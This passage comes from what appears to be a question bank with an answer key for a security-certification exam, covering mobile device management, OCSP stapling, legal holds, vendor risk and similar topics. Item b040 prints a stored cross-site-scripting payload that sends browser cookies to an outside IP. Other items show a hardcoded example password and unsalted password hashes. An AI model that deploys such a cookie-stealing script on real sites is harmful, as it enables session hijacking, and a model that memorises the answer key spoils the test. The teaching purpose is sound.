 w:"Risk register rows: description, likelihood, impact, KRI, threshold, and a named risk owner who is accountable for the response."},

{id:"b030",obj:"4.1",d:4,cat:"harden",t:"mc",
 q:"A brokerage wants traders to use smartphones for approved trading apps and secure chat, must be able to wipe firm data remotely, and must keep firm data isolated from personal photos and apps that the company does not want to see or manage. Traders will pick from a short list of approved models the firm buys. Which of the following BEST fits?",
 o:[
  {t:"CYOD devices enrolled in MDM with a managed work container",ok:true,x:"Choose-your-own-device lets the firm own and buy the phone from an approved list, and MDM containerization separates firm data (wipeable) from the personal profile the firm stays out of."},
  {t:"BYOD with a policy requiring full-device wipe on departure",ok:false,x:"BYOD means employees own the phones, contradicting the firm buying approved models, and full-device wipes of personal phones create legal and privacy problems."},
  {t:"COPE devices with all personal use prohibited",ok:false,x:"The firm explicitly expects personal photos and apps on the device; a no-personal-use policy does not match the requirement."},
  {t:"Unmanaged devices with the trading app protected by MFA only",ok:false,x:"Without MDM there is no remote wipe, no data isolation, and no ability to enforce the approved-model list."}
 ],
 w:"BYOD = employee-owned; CYOD = company-owned from an approved list; COPE = company-owned, personal use allowed. MDM containers separate work and personal data on any of them."},


{id:"b031",obj:"1.4",d:1,cat:"crypto",t:"mc",
 q:"A bank's customer-facing TLS certificates are revoked and reissued whenever a private key is rotated. Customers on slow mobile links complain that the login page stalls while their browser contacts the CA. The bank wants revocation checking to remain reliable but with no extra client round trip. Which of the following should be implemented?",
 o:[
  {t:"OCSP stapling on the bank's web servers",ok:true,x:"With stapling, the server periodically fetches a signed OCSP response from the CA and includes it in the TLS handshake, so the client gets fresh revocation status without its own query to the CA."},
  {t:"Publishing a larger CRL with a longer validity period",ok:false,x:"A CRL still requires the client to download the whole list, which is slower on mobile links, and a longer validity means revoked certificates are trusted for longer."},
  {t:"Switching to self-signed certificates to eliminate the CA lookup",ok:false,x:"Self-signed certificates would produce browser warnings for every customer and remove third-party trust entirely; they solve latency by abandoning security."},
  {t:"Placing the private keys in an HSM",ok:false,x:"An HSM protects the key material at rest and in use; it has no effect on how clients check whether a certificate has been revoked."}
 ],
 w:"CRL = client downloads a list; OCSP = client asks about one serial; OCSP stapling = server delivers the CA's signed answer inside the handshake."},

{id:"b032",obj:"2.3",d:2,cat:"vulns",t:"mc",
 q:"A vendor notifies a manufacturing plant that attackers are actively exploiting a previously unknown flaw in the plant's PLC firmware. No patch exists yet and the vendor estimates six weeks to release one. Which of the following BEST describes the vulnerability, and which response is MOST appropriate in the meantime?",
 o:[
  {t:"A zero-day; apply compensating controls such as tighter segmentation and monitoring for exploit indicators",ok:true,x:"A zero-day is a flaw exploited before a fix is available. Since patching is impossible, the plant reduces reachability of the PLCs and watches for the published indicators until the fix ships."},
  {t:"A zero-day; disable the PLCs until the vendor patch is released",ok:false,x:"Halting production for six weeks is rarely proportionate; compensating controls exist precisely to keep operating safely while a patch is pending."},
  {t:"An end-of-life vulnerability; replace the PLCs with a supported model",ok:false,x:"The PLCs are supported and a patch is coming; end-of-life means the vendor will never fix it, which is not the case here."},
  {t:"A misconfiguration; restore the firmware's default settings",ok:false,x:"The flaw is in the firmware code itself, not in how it was configured; defaults would not remove the vulnerability."}
 ],
 w:"Zero-day = exploited with no patch available. Response: compensating controls (segmentation, allow lists, monitoring) until the fix arrives, then patch and rescan."},

{id:"b033",obj:"4.8",d:4,cat:"ir",t:"mc",
 q:"A brokerage receives notice that a regulator is investigating a former trader. Legal expects litigation. The trader's mailbox and chat history are scheduled to be purged under the normal 90-day retention policy next week. Which of the following should the security team do FIRST?",
 o:[
  {t:"Place the trader's data under legal hold so that retention purging is suspended",ok:true,x:"A legal hold overrides normal retention to preserve potentially relevant evidence once litigation is reasonably anticipated. Letting the purge run could be treated as destruction of evidence."},
  {t:"Export the mailbox to a USB drive and hand it to the regulator",ok:false,x:"Handing over evidence without a documented acquisition process or chain of custody, and before legal defines scope, undermines admissibility and may overshare."},
  {t:"Let the retention policy run because it is the documented process",ok:false,x:"Retention policies must yield to legal hold obligations; following the schedule here would destroy relevant evidence."},
  {t:"Begin e-discovery review of the messages for relevance",ok:false,x:"E-discovery happens after preservation is guaranteed; reviewing first while the purge is still scheduled risks losing the data mid-review."}
 ],
 w:"Preservation comes first: legal hold suspends retention deletion, then acquisition with chain of custody, then e-discovery."},

{id:"b034",obj:"5.3",d:5,cat:"third",t:"ms",pick:2,
 q:"A startup is negotiating with a managed database provider and wants the contract to make the provider's performance measurable and enforceable. Which TWO of the following belong in the service-level agreement?",
 o:[
  {t:"A monthly availability target of 99.95% with service credits when it is missed",ok:true,x:"Availability targets with defined remedies are the core of an SLA: measurable, time-bound, and tied to a consequence."},
  {t:"A maximum four-hour response time for severity-one support tickets",ok:true,x:"Support responsiveness is a standard SLA metric; it defines what the customer can expect and hold the provider to."},
  {t:"A list of the specific migration tasks and deliverables for onboarding",ok:false,x:"Scoped tasks and deliverables belong in a statement of work, not in the ongoing performance commitments of the SLA."},
  {t:"The general terms of liability and payment governing all future work",ok:false,x:"Those umbrella terms are the content of a master service agreement."},
  {t:"A promise by both parties to keep each other's information confidential",ok:false,x:"Confidentiality obligations are set out in a non-disclosure agreement, not measured as a service level."}
 ],
 w:"SLA = measurable service metrics plus remedies (uptime, response time, RPO/RTO). Deliverables go in the SOW, legal umbrella terms in the MSA, secrecy in the NDA."},

{id:"b035",obj:"3.1",d:3,cat:"arch",t:"mc",
 q:"A security engineer reviews a startup's infrastructure-as-code repository and finds the snippet below in a file that is committed to the shared repository and used by every deployment. Which of the following is the MOST significant problem?",
 ex:"resource \"cloud_db_instance\" \"orders\" {\n  engine          = \"postgres\"\n  master_username = \"admin\"\n  master_password = \"Pr0d-Orders-2026!\"\n  publicly_accessible = false\n}",
 o:[
  {t:"A production secret is hardcoded in version control, exposed to every repository user and kept in history forever",ok:true,x:"IaC templates are widely shared and their history is permanent; a plaintext password in them is effectively leaked. Secrets should be referenced from a secrets manager or injected at deploy time."},
  {t:"The database is not publicly accessible, which will break the application",ok:false,x:"Keeping the database off the internet is correct; the application should reach it over the private network."},
  {t:"The template uses PostgreSQL instead of a managed NoSQL service",ok:false,x:"Engine choice is an application decision with no inherent security flaw."},
  {t:"The username 'admin' violates naming conventions",ok:false,x:"A predictable admin username is a minor hardening point; it is trivial compared to a plaintext production password committed to the repo."}
 ],
 w:"IaC gives repeatable, reviewable infrastructure, but templates are code: never commit secrets. Use a secrets manager and scan repositories for credentials."},

{id:"b036",obj:"2.2",d:2,cat:"social",t:"mc",
 q:"A control room supervisor at a plant receives a phone call from someone who says they are from the SCADA vendor's support desk, quotes a real open ticket number, and asks the supervisor to read out the remote-access passcode so they can 'finish the fix'. Which of the following BEST describes this attack?",
 o:[
  {t:"Vishing combined with impersonation",ok:true,x:"The attack is delivered by voice call and the caller poses as a trusted vendor, using a real ticket number as a pretext to make the request believable."},
  {t:"Smishing",ok:false,x:"Smishing is phishing over SMS text messages; this attack came by a live phone call."},
  {t:"Business email compromise",ok:false,x:"BEC uses email, typically a compromised or spoofed business account, to redirect funds or data; no email was involved here."},
  {t:"Watering hole attack",ok:false,x:"A watering hole plants malware on a website the targets frequently visit; this was a direct human-to-human request for a credential."}
 ],
 w:"Vishing = voice phishing. Real details like ticket numbers make the pretext convincing; the defense is to call the vendor back on a known number."},

{id:"b037",obj:"4.4",d:4,cat:"ops",t:"mc",
 q:"A bank's SOC suspects that data is slowly leaving a research subnet, but the endpoint agents show nothing unusual and packet captures on every link are not feasible. The SOC wants to see which internal hosts are sending large volumes to which external addresses, over time, using data the routers already produce. Which of the following should be used?",
 o:[
  {t:"NetFlow exported from the core routers to the SIEM",ok:true,x:"Flow records summarize who talked to whom, on what ports, and how many bytes, without full packet capture. Aggregated over time they reveal steady outbound volume to an unusual destination."},
  {t:"SNMP traps from the routers",ok:false,x:"Traps are event notifications such as a link going down or a threshold crossing; they do not describe individual conversations or per-destination byte counts."},
  {t:"A vulnerability scanner sweep of the research subnet",ok:false,x:"Scanning finds weaknesses on hosts; it says nothing about what traffic those hosts are actually sending."},
  {t:"Host-based antivirus signature updates",ok:false,x:"The agents already report nothing, and signatures cannot reveal network-level exfiltration patterns."}
 ],
 w:"NetFlow = metadata about conversations (volume, endpoints, timing) at scale; packet capture = full content on a specific link; SNMP traps = device events."},

{id:"b038",obj:"1.4",d:1,cat:"ports",t:"ms",pick:2,
 q:"A configuration audit of a plant's network management practices produces the findings below. Which TWO changes would BEST remediate them?",
 ex:"F1: Switch configs backed up nightly to 10.20.5.9 using FTP (port 21)\nF2: Network monitoring polls switches with SNMPv2c, community string 'public'\nF3: Engineers manage switches over SSH (port 22)\nF4: NTP served from an internal stratum-2 server",
 o:[
  {t:"Replace FTP with SFTP over port 22 for configuration backups",ok:true,x:"FTP sends credentials and the full switch configuration in clear text; SFTP runs inside SSH and encrypts both, using a port already permitted for management."},
  {t:"Migrate monitoring to SNMPv3 with authentication and privacy enabled",ok:true,x:"SNMPv2c community strings travel in clear text and 'public' is a default; SNMPv3 adds authenticated, encrypted polling."},
  {t:"Replace SSH with Telnet on port 23 to match the vendor default",ok:false,x:"Telnet is unencrypted; SSH on port 22 is already the secure choice for F3 and needs no change."},
  {t:"Move NTP to an external public pool on port 123",ok:false,x:"An internal stratum-2 server is appropriate for an OT network; pulling time from the internet adds exposure without fixing any finding."},
  {t:"Change the SNMP community string from 'public' to a random value but keep v2c",ok:false,x:"A stronger community string still crosses the network unencrypted and can be sniffed; only SNMPv3 provides real protection."}
 ],
 w:"Secure protocol selection: FTP to SFTP/FTPS, Telnet to SSH, SNMPv1/2c to SNMPv3, HTTP to HTTPS, LDAP to LDAPS."},

{id:"b039",obj:"5.3",d:5,cat:"third",t:"mc",
 q:"Two fintech companies agree to jointly build and sell a combined product. They need a document defining each company's contributions, how revenue will be divided, and how decisions and liabilities are shared. Which of the following agreement types is MOST appropriate?",
 o:[
  {t:"Business partners agreement",ok:true,x:"A BPA is the document for a joint business venture: it sets out each partner's investment, responsibilities, profit and loss sharing, and decision-making rights."},
  {t:"Service-level agreement",ok:false,x:"An SLA measures a provider's performance for a customer; neither company is a customer of the other in a joint venture."},
  {t:"Memorandum of agreement",ok:false,x:"An MOA records cooperative intent between organizations and generally lacks the detailed revenue-sharing and liability terms a joint product requires."},
  {t:"Work order",ok:false,x:"A work order authorizes a specific task under an existing contract; it does not establish a partnership."}
 ],
 w:"BPA = partnership terms (contributions, profits, liabilities). MOU/MOA = intent to cooperate. SLA = service metrics. WO/SOW = specific tasks."},

{id:"b040",obj:"2.4",d:2,cat:"attacks",t:"mc",
 q:"A startup's support portal lets customers post comments. The application log records the entry below submitted through the comment form. Which of the following attacks is being attempted?",
 ex:"POST /tickets/4471/comment\nbody=Thanks for the help!<script>fetch('https://198.51.100.9/c?d='+document.cookie)</script>",
 o:[
  {t:"Stored cross-site scripting to steal support agents' session cookies",ok:true,x:"Script tags saved in a comment will execute in the browser of every agent who views the ticket, sending their session cookie to the attacker's server. Stored XSS targets other users, not the server."},
  {t:"SQL injection against the ticket database",ok:false,x:"There is no SQL syntax in the payload; it is JavaScript intended for a browser, not a query manipulation."},
  {t:"Cross-site request forgery",ok:false,x:"CSRF tricks a logged-in user's browser into sending a request the attacker crafted; it does not involve injecting script into stored content."},
  {t:"Server-side request forgery",ok:false,x:"SSRF makes the server itself fetch attacker-chosen URLs; here the fetch runs in a victim's browser using their cookie."}
 ],
 w:"Script in user-supplied content that later renders for other users = stored XSS. Fix with output encoding, input validation, and HttpOnly cookies."},

{id:"b041",obj:"3.4",d:3,cat:"data",t:"mc",dg:"backups",
 q:"A bank's file server runs a full backup every Sunday night and a differential backup every night from Monday through Saturday. The server's disks fail on Thursday morning. Which of the following describes the restore that is needed?",
 o:[
  {t:"Restore Sunday's full backup, then Wednesday night's differential only",ok:true,x:"Each differential contains everything changed since the last full backup, so the most recent one (Wednesday) already includes Monday and Tuesday's changes."},
  {t:"Restore Sunday's full backup, then Monday, Tuesday, and Wednesday's backups in order",ok:false,x:"Applying every nightly copy is the incremental restore process; with differentials the earlier ones are redundant."},
  {t:"Restore only Wednesday night's backup because it is the most recent",ok:false,x:"A differential contains only changes since Sunday; without the full backup the unchanged files are missing."},
  {t:"Restore Sunday's full backup and accept the loss of the week's changes",ok:false,x:"The differential exists precisely to recover the week's changes; ignoring it would violate the bank's RPO unnecessarily."}
 ],
 w:"Differential = changes since the last full (restore full + latest diff). Incremental = changes since the last backup of any kind (restore full + every incremental in order)."},

{id:"b042",obj:"4.6",d:4,cat:"iam",t:"mc",
 q:"A brokerage wants its trading platform to allow order entry only when the user holds the trader role, is connecting from a managed device, is inside a trading floor location, and it is within market hours. Which of the following access control models BEST supports evaluating all of these conditions together?",
 o:[
  {t:"Attribute-based access control",ok:true,x:"ABAC evaluates policies over many attributes of the subject, resource, and environment, such as role, device state, location, and time, in a single decision."},
  {t:"Role-based access control",ok:false,x:"RBAC grants permissions by role membership alone; it cannot by itself consider device posture, location, or the time of day."},
  {t:"Discretionary access control",ok:false,x:"DAC lets resource owners grant access at their discretion; it is not policy-driven and does not evaluate contextual conditions."},
  {t:"Mandatory access control",ok:false,x:"MAC compares clearance labels to classification labels; it has no notion of market hours or device health."}
 ],
 w:"When a decision depends on multiple contextual attributes (who, what device, where, when), ABAC is the model. RBAC handles the 'who' only."},

{id:"b043",obj:"2.1",d:2,cat:"actors",t:"mc",
 q:"Over 18 months, a plant's engineering network is quietly accessed by an actor using custom implants that mimic legitimate PLC vendor tools. Nothing is damaged; only proprietary process designs and control logic are copied. Which of the following actor types and motivations is MOST likely?",
 o:[
  {t:"Nation-state actor motivated by espionage",ok:true,x:"Long dwell time, custom tooling tailored to a specific ICS vendor, and theft of industrial designs without disruption point to a well-resourced state actor conducting industrial espionage."},
  {t:"Hacktivist motivated by philosophical beliefs",ok:false,x:"Hacktivists seek publicity through defacement, leaks, or disruption; silently stealing process designs for 18 months does not serve a public message."},
  {t:"Unskilled attacker motivated by chaos",ok:false,x:"Custom implants disguised as vendor tools require significant skill and resources far beyond off-the-shelf attacks."},
  {t:"Organized crime motivated by financial gain through ransomware",ok:false,x:"Criminal groups monetize quickly, usually by encrypting systems or extorting; they would not sit unnoticed for 18 months copying control logic."}
 ],
 w:"Stealth, patience, custom tools, and theft of intellectual property = nation-state espionage. Noise and quick monetization = organized crime."},

{id:"b044",obj:"5.3",d:5,cat:"third",t:"mc",
 q:"A bank completed thorough due diligence when it selected a fraud-detection vendor three years ago. Since then, the vendor has been acquired twice and its security certification has lapsed, but nobody at the bank noticed. Which of the following third-party risk practices was missing?",
 o:[
  {t:"Ongoing vendor monitoring",ok:true,x:"Vendor risk changes over time; monitoring through recurring questionnaires, certification tracking, and news of ownership changes would have surfaced the lapsed certification and acquisitions."},
  {t:"Initial due diligence",ok:false,x:"Due diligence was performed at selection; the failure was in what happened after the contract was signed."},
  {t:"Conflict-of-interest screening",ok:false,x:"Nothing suggests bank staff had personal stakes in the vendor; the issue is the vendor's changed risk profile going unnoticed."},
  {t:"Rules of engagement for penetration testing",ok:false,x:"Rules of engagement scope a test; they do not track a vendor's certifications or ownership."}
 ],
 w:"Third-party risk is a lifecycle: due diligence at selection, contractual controls, then continuous monitoring for changes in ownership, financial health, and certifications."},

{id:"b045",obj:"3.1",d:3,cat:"arch",t:"mc",
 q:"A startup decomposed its monolith into 40 microservices that call each other over the internal network. A compromised container in one service was able to call the payments service directly, because internal calls are trusted. Which of the following BEST addresses this weakness?",
 o:[
  {t:"Require mutual TLS with per-service identities so every call is authenticated and authorized",ok:true,x:"Microservices multiply the internal attack surface; mTLS gives each service a verifiable identity so the payments service can reject calls from a service that should never talk to it."},
  {t:"Merge the services back into a single monolith",ok:false,x:"Reverting the architecture removes the benefits of microservices and does not address authentication; a compromised module in a monolith has the same reach."},
  {t:"Place a WAF in front of the public API gateway",ok:false,x:"A WAF inspects traffic from external clients; the problem is east-west traffic between internal services behind the gateway."},
  {t:"Increase the CPU and memory limits on the payments container",ok:false,x:"Resource limits affect availability and cost, not whether an internal caller is allowed to invoke the service."}
 ],
 w:"Microservices need zero trust internally: service identity, mTLS, and authorization on every call. The network being 'internal' is not a control."},

{id:"b046",obj:"4.1",d:4,cat:"harden",t:"mc",
 q:"A bank has documented a hardened configuration for teller workstations and pushed it to 2,000 machines through Group Policy. Six months later an audit finds many workstations have drifted, with local firewall exceptions and disabled screen locks. Which of the following secure baseline activities was neglected?",
 o:[
  {t:"Maintaining the baseline through ongoing compliance monitoring and remediation of drift",ok:true,x:"A baseline has three phases: establish, deploy, maintain. The configuration was established and deployed, but no process re-checked hosts against it and corrected deviations."},
  {t:"Establishing the baseline from an industry benchmark",ok:false,x:"The hardened configuration existed and was documented; the problem arose after deployment, not in defining the standard."},
  {t:"Deploying the baseline to the workstation fleet",ok:false,x:"Group Policy did deploy it to all 2,000 hosts; the settings later changed and were never reapplied."},
  {t:"Performing a wireless site survey of the branches",ok:false,x:"Site surveys concern access point placement and coverage and have nothing to do with workstation configuration drift."}
 ],
 w:"Baselines decay. Establish, deploy, then maintain with regular scans (SCAP/benchmark tools) and automatic re-enforcement of settings."},

{id:"b047",obj:"1.4",d:1,cat:"crypto",t:"mc",
 q:"A penetration tester extracts the credential table below from a startup's legacy application. Which of the following weaknesses does the table MOST clearly demonstrate?",
 ex:"username   pwd_hash\nalice      5f4dcc3b5aa765d61d8327deb882cf99\nbob        e10adc3949ba59abbe56e057f20f883e\ncarol      5f4dcc3b5aa765d61d8327deb882cf99\ndave       5f4dcc3b5aa765d61d8327deb882cf99",
 o:[
  {t:"Passwords are hashed without a salt, so identical passwords produce identical hashes",ok:true,x:"Three users share the exact same digest, which can only happen if no per-user salt was mixed in. An attacker cracks one and gets all three, and can use precomputed tables."},
  {t:"Passwords are stored using reversible encryption",ok:false,x:"The values are fixed-length hex digests characteristic of a hash, not ciphertext; nothing indicates a decryption key exists."},
  {t:"The application uses key stretching with too high a work factor",ok:false,x:"A stretched hash would still differ per user when salted; and the 32-hex-character output is an unstretched fast hash, not a bcrypt or PBKDF2 string."},
  {t:"The hashes are colliding because the algorithm is broken",ok:false,x:"A collision is two different inputs producing one hash; here the far simpler explanation is that alice, carol, and dave chose the same password."}
 ],
 w:"Same password, same hash = no salt. A unique random salt per user makes every stored hash different even for identical passwords."},

{id:"b048",obj:"2.3",d:2,cat:"vulns",t:"mc",
 q:"A plant purchases replacement industrial switches from a low-cost online reseller instead of the manufacturer's authorized channel. Weeks later, network monitoring detects the switches sending configuration data to an unknown external address, and the manufacturer confirms the serial numbers are not genuine. Which of the following BEST describes the vulnerability?",
 o:[
  {t:"Hardware supply chain compromise via a counterfeit provider",ok:true,x:"Buying outside authorized channels allowed tampered or counterfeit hardware into the OT network. Supply chain vulnerabilities include hardware, software, and service providers."},
  {t:"Firmware end-of-life on the switches",ok:false,x:"End-of-life means the vendor no longer supports the product; these units were never genuine vendor products in the first place."},
  {t:"Default credentials left on the switches",ok:false,x:"Default credentials would enable an attacker to log in; they would not cause the switch itself to phone home with configuration data."},
  {t:"Unsupported system due to missing patches",ok:false,x:"Patching status is irrelevant when the hardware itself was built or modified to exfiltrate data."}
 ],
 w:"Supply chain risk covers what you buy and from whom. Procure from authorized channels, verify serials, and inspect firmware before connecting OT equipment."},

{id:"b049",obj:"4.3",d:4,cat:"ops",t:"mc",
 q:"A vulnerability scan flags a critical flaw in a safety-instrumented controller at a plant. The vendor has no patch and the controller cannot be replaced for two years. Management agrees the risk must be documented and approved, and the controller is moved to a dedicated VLAN with strict ACLs. Which of the following BEST describes the response?",
 o:[
  {t:"A documented exception with a compensating control",ok:true,x:"When patching is impossible, the vulnerability management process records a formal exception approved by management and pairs it with a compensating control (segmentation) that reduces the risk."},
  {t:"Marking the finding as a false positive",ok:false,x:"The vulnerability is real and confirmed; a false positive is a scanner error, which is not the case."},
  {t:"Transferring the risk through cyber insurance",ok:false,x:"Insurance may be part of the broader strategy, but the actions described (approval and segmentation) are an exception with mitigation, not a transfer."},
  {t:"Rescanning to validate remediation",ok:false,x:"Rescanning verifies that a fix was applied; nothing was fixed here, only isolated."}
 ],
 w:"Vulnerability responses: patch, segment, compensating control, insurance, or a documented exception/exemption. Exceptions require approval and usually a compensating control."},

{id:"b050",obj:"5.1",d:5,cat:"gov",t:"mc",
 q:"A bank is rolling out a new loan-origination system. IT operations will run the servers and backups, a data quality team will ensure records are accurate and consistently formatted, and the head of lending must decide the system's data classification and who may access it. Which of the following correctly matches the head of lending's role?",
 o:[
  {t:"Data owner",ok:true,x:"The owner is the senior business person accountable for the data, who sets its classification and approves access. That is exactly what the head of lending is being asked to do."},
  {t:"Data custodian",ok:false,x:"The custodian implements the technical protection, storage, and backups; that is the IT operations role in this scenario."},
  {t:"Data steward",ok:false,x:"The steward focuses on data quality, definitions, and consistent use, which describes the data quality team."},
  {t:"Data processor",ok:false,x:"A processor is an outside party handling personal data on a controller's instructions; the head of lending is inside the bank making ownership decisions."}
 ],
 w:"Owner = accountable, sets classification and access; steward = quality and meaning; custodian = technical handling; controller/processor = privacy-law roles."},

{id:"b051",obj:"3.2",d:3,cat:"netsec",t:"mc",
 q:"A brokerage places an inline DLP appliance on the only path used to transmit client statements to an external print vendor. Regulators require that unencrypted client data never leaves the firm unchecked. Which of the following failure modes should the appliance be configured for, and why?",
 o:[
  {t:"Fail-closed, because blocking traffic during an outage is preferable to letting unchecked data leave",ok:true,x:"Given the regulatory requirement, the cost of a temporary transfer delay is lower than the cost of an unrecorded data leak, so the device should drop traffic when it fails."},
  {t:"Fail-open, because availability of the print process is the priority",ok:false,x:"Fail-open would let statements flow uninspected whenever the appliance crashed, directly violating the requirement that data never leaves unchecked."},
  {t:"Fail-open, because DLP appliances are passive and cannot block anyway",ok:false,x:"The appliance is described as inline, meaning it actively sits in the path and can block; a passive tap-based sensor is a different deployment."},
  {t:"Fail-closed, because it reduces the cost of the appliance",ok:false,x:"Failure mode is a security-versus-availability decision, not a cost feature; the justification is regulatory risk, not price."}
 ],
 w:"Fail-closed favors security (stop traffic if the control dies); fail-open favors availability. Choose based on which loss hurts more for that specific path."},

{id:"b052",obj:"4.8",d:4,cat:"ir",t:"ms",pick:2,
 q:"A bank's SOC confirms that a ransomware operator has encrypted three file servers and is attempting to reach others using a stolen domain administrator credential. Which TWO of the following are containment actions appropriate at this stage?",
 o:[
  {t:"Disable the compromised domain administrator account and reset its credentials",ok:true,x:"Removing the attacker's credential stops lateral movement immediately without destroying evidence; it limits the incident's scope."},
  {t:"Block the affected servers' network segments from reaching the rest of the domain",ok:true,x:"Network isolation of the infected segment prevents the encryption from spreading while the team plans eradication and recovery."},
  {t:"Restore all three file servers from last night's backups",ok:false,x:"Restoration is recovery; doing it while the attacker still holds valid access means the restored systems may simply be encrypted again."},
  {t:"Wipe and rebuild the domain controllers",ok:false,x:"Rebuilding is eradication and is premature before the attacker's access has been cut off and the scope understood."},
  {t:"Hold a lessons-learned meeting to review the initial access vector",ok:false,x:"Lessons learned is the final phase after recovery; during an active spread the priority is stopping it."}
 ],
 w:"Containment = stop the bleeding (isolate, disable credentials, block C2). Eradication and recovery come after the attacker's access is cut."},

{id:"b053",obj:"2.4",d:2,cat:"attacks",t:"mc",
 q:"A startup's cloud bill triples in a week. An engineer runs the command below on one of the Kubernetes worker nodes. Which of the following is the MOST likely explanation?",
 ex:"$ top -b -n 1 | head -6\nload average: 31.2, 30.8, 30.1\nPID    USER   %CPU  %MEM  COMMAND\n41877  root   796.3  1.2   kdevtmpfsi\n41901  root   3.1   0.4   kubelet\n1224   root   0.9   0.2   containerd",
 o:[
  {t:"A container was compromised and is running a cryptominer, shown by sustained resource consumption",ok:true,x:"An unfamiliar root process consuming nearly all CPU across many cores, with a matching spike in cost, is the classic indicator of cryptojacking after a container or exposed API was exploited."},
  {t:"The kubelet is misconfigured and is restarting pods in a loop",ok:false,x:"The kubelet is using 3% CPU; the load is clearly coming from a single unknown process, not from orchestration churn."},
  {t:"A distributed denial-of-service attack is saturating the node's network",ok:false,x:"A DDoS would show as network exhaustion or unresponsive services, not one local process consuming 800% CPU."},
  {t:"The node's disk is failing and causing high I/O wait",ok:false,x:"Disk problems show as I/O wait, not as a specific user-space process burning CPU cycles."}
 ],
 w:"Unexplained resource consumption (CPU, cloud spend) is a malicious-activity indicator. Cryptominers are the common payload after container or cloud credential compromise."},

{id:"b054",obj:"5.3",d:5,cat:"third",t:"mc",
 q:"A bank is selecting a vendor to host its mobile banking backend. Before signing, the procurement team reviews the vendor's audited financial statements, checks references from similar customers, verifies its security certifications, and researches any regulatory actions against it. Which of the following BEST describes this activity?",
 o:[
  {t:"Due diligence in vendor selection",ok:true,x:"Investigating a prospective vendor's financial health, reputation, certifications, and legal history before committing is the definition of due diligence."},
  {t:"Right-to-audit exercise",ok:false,x:"A right-to-audit is a contractual power used after signing to inspect the vendor's controls; here no contract exists yet."},
  {t:"Vendor monitoring",ok:false,x:"Monitoring is the ongoing review of an existing vendor; this is pre-contract evaluation."},
  {t:"Supply chain analysis of the vendor's own suppliers",ok:false,x:"Supply chain analysis looks at the vendor's downstream providers; the activities described focus on the vendor itself."}
 ],
 w:"Due diligence happens before the contract; right-to-audit and monitoring happen after. Conflict-of-interest checks belong to the selection stage too."},

{id:"b055",obj:"1.2",d:1,cat:"controls",t:"mc",
 q:"A plant's security team wants early warning if an attacker reaches the OT network. They deploy a device that answers on Modbus and looks like a real PLC but controls nothing, with any connection to it generating an alert. Which of the following BEST describes this deployment?",
 o:[
  {t:"A honeypot",ok:true,x:"A single decoy system that imitates a real asset to attract and reveal attackers is a honeypot; because no legitimate process should ever touch it, any contact is a high-fidelity alert."},
  {t:"A honeynet",ok:false,x:"A honeynet is an entire decoy network of multiple systems; this is one device."},
  {t:"A honeytoken",ok:false,x:"A honeytoken is a piece of fake data such as a bogus credential or record; the plant deployed a fake system, not fake data."},
  {t:"A honeyfile",ok:false,x:"A honeyfile is a decoy document placed on a share to detect access; a network-listening fake PLC is a system-level decoy."}
 ],
 w:"Honeypot = one decoy system; honeynet = a decoy network; honeyfile = decoy document; honeytoken = decoy data such as a fake credential or API key."},

{id:"b056",obj:"3.3",d:3,cat:"data",t:"mc",
 q:"A bank's developers need a realistic copy of the production customer database for testing, but policy prohibits real account numbers and names in non-production environments. The tests require that account numbers still pass format validation and that referential links between tables remain intact. Which of the following should be used?",
 o:[
  {t:"Data masking that replaces sensitive fields with consistent, format-preserving substitute values",ok:true,x:"Masking irreversibly swaps real values for realistic fakes while preserving format and consistency across tables, which keeps the test data usable without exposing real customers."},
  {t:"Encrypting the copy with a key held only by the DBA",ok:false,x:"Encrypted fields would fail format validation, and the moment a developer needs to read them the real data is exposed."},
  {t:"Hashing each account number with SHA-256",ok:false,x:"Hashes are fixed-length hex strings that will not pass account number format checks, and unsalted hashes of short numbers can be reversed."},
  {t:"Granting developers read-only access to production instead",ok:false,x:"Read-only access still exposes real customer data to developers, which the policy forbids."}
 ],
 w:"Masking (static, for non-prod copies) removes real values while keeping data realistic. Tokenization keeps a reversible vault; encryption is reversible with the key."},

{id:"b057",obj:"4.7",d:4,cat:"ops",t:"mc",
 q:"A startup's engineers frequently deploy cloud storage with public read access by mistake. The security team wants deployments that contain such a setting to be rejected automatically in the pipeline before anything is created, without a human review of every change. Which of the following automation use cases does this describe?",
 o:[
  {t:"Guard rails enforced in the CI/CD pipeline",ok:true,x:"Guard rails are automated policy checks that block non-compliant infrastructure definitions before deployment, letting engineers move fast within safe boundaries."},
  {t:"Automated ticket creation for each public bucket",ok:false,x:"Ticketing records the problem after it already exists; the requirement is to prevent creation in the first place."},
  {t:"User provisioning through the identity provider",ok:false,x:"User provisioning automates account lifecycle; it is unrelated to storage configuration."},
  {t:"Escalation of alerts to the on-call engineer",ok:false,x:"Escalation routes an existing alert to a person; again this happens after the misconfiguration is live."}
 ],
 w:"Guard rails = automated preventive policy enforcement in pipelines and cloud accounts. They scale security review without adding manual gates."},

{id:"b058",obj:"2.2",d:2,cat:"vulns",t:"mc",
 q:"A plant's HMI vendor pushes a routine software update through its normal update server. Days later, several HMIs begin sending screenshots to an external host. Investigation shows the update was correctly signed with the vendor's certificate, whose private key had been stolen from the vendor's build system. Which of the following BEST describes the vulnerability?",
 o:[
  {t:"Malicious update delivered through a compromised software supply chain",ok:true,x:"The attacker did not exploit the HMIs directly; they compromised the vendor's build and signing process so the trusted update mechanism delivered malware."},
  {t:"Side loading of unapproved applications on the HMIs",ok:false,x:"Side loading is installing software outside the official channel; this malware arrived through the official, signed channel."},
  {t:"Cryptographic vulnerability due to a weak signing algorithm",ok:false,x:"The algorithm was not broken; the key was stolen. Signature validation worked exactly as designed on a maliciously signed package."},
  {t:"Firmware end-of-life on the HMI hardware",ok:false,x:"The hardware was fully supported and receiving updates; that update channel was the attack path."}
 ],
 w:"A valid signature proves the signer's key was used, not that the signer was honest or uncompromised. Supply chain defenses include SBOMs, vendor assessment, and monitoring post-update behavior."},

{id:"b059",obj:"5.4",d:5,cat:"gov",t:"mc",
 q:"A startup provides spending-insight analytics to a bank, processing the bank's customer transaction data strictly according to the bank's instructions. A bank customer emails the startup demanding that all data about them be erased. Which of the following is the startup's correct action?",
 o:[
  {t:"Refer the request to the bank, because as the processor it acts only on the controller's instructions",ok:true,x:"The bank decides the purposes of processing and is the controller; data subject requests are the controller's to evaluate. The processor supports the response but must not act unilaterally."},
  {t:"Delete the customer's data immediately to honor the right to be forgotten",ok:false,x:"The startup has no authority to decide the request; erasure may conflict with the bank's legal retention duties, and unilateral deletion breaches the processing agreement."},
  {t:"Ignore the request because the startup has no direct relationship with the customer",ok:false,x:"Processors cannot ignore data subject requests; they are obligated to pass them to the controller promptly."},
